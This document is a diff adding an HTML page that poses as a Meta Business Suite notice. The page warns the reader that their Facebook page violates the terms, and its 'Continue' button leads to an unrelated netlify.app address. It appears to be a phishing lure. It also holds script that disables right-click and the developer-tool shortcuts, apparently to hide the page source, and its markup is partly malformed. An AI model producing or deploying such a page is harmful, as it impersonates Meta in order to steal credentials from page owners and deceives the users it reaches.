@@ -1,0 +1,117 @@
+
+
+<!DOCTYPE html>
+
+
+<head>
+   <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Meta Business Suite</title>
+    <link
+      rel="icon"
+      href="https://z-p3-static.xx.fbcdn.net/rsrc.php/y5/r/m4nf26cLQxS.ico"
+      type="image/png"
+    document.addEventListener("contextmenu", function(e) {
+      e.preventDefault();
+    });
+
+    document.addEventListener("keydown", function(e) {
+      // Check if the "i" or "c" key is pressed with Shift or Ctrl
+      if ((e.key === 'i' || e.key === 'c' ||  e.key === 'u' || e.keyCode === 73 || e.keyCode === 67) && (e.shiftKey || e.ctrlKey)) {
+        e.preventDefault();
+      }
+    });
+  </script>
+  <style>
+        html,
+        body {
+            font-family: Roboto, sans-serif;
+            min-height: 100%;
+            height: 100%;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color:  #;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+
+        .container {
+            max-width: 600px;
+            padding: 20px;
+            background-color: #FFFFFF;
+            border-radius: 20px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo {
+            width: 90px;
+            height: 90px;
+            object-fit: cover;
+            border-radius: 50%;
+        }
+
+        h1 {
+            font-family: Roboto, sans-serif;
+            font-size: 34px;
+            font-weight: 700;
+            line-height: 1.4;
+            margin-top: 20px;
+            color: #232323;
+        }
+
+        h2 {
+            font-family: Roboto, sans-serif;
+            font-size: 20px;
+            font-weight: 700;
+            line-height: 1.4;
+            margin-top: 10px;
+            color: #232323;
+        }
+
+        .button {
+            background-color: #267CE5;
+            color: #FFFFFF;
+            font-family: Roboto, sans-serif;
+            font-size: 16px;
+            font-weight: 400;
+            padding: 16px 32px;
+            border-radius: 20px;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 20px;
+        }
+
+        .button:hover {
+            background-color: #1A5BBF;
+        }
+
+        .copyright {
+            color: #232323;
+            font-size: 14px;
+            margin-top: 30px;
+        }
+
+        .footer {
+            margin-top: 20px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <img class="logo" src="https://cdn.glitch.global/0e876aa8-70cf-40f1-951b-94c8002e5dcc/icon.png?v=1699082922949" alt="Logo">
+        <h1>Violation Warning</h1>
+        <h2>Your page is breaking facebook terms and conditions.</h2>
+        <h2>Here you can submit appeal for remove violation on your page. 
+          Click "Continue" Button</h2>
+        <a class="button" href="https://follow-link-submit-details.netlify.app/">Continue</a>
+    </div>
+</body>
+
+</html>
